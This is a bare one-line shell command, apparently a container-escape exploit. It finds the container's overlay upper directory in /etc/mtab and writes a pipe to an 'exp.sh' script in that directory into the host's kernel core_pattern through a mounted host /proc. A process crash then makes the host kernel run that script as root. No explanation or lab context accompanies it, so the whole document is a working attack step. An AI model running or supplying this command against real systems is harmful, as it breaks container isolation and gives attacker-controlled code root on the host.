echo -e "|$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)/exp.sh \rcore " > /host_proc/sys/kernel/core_pattern
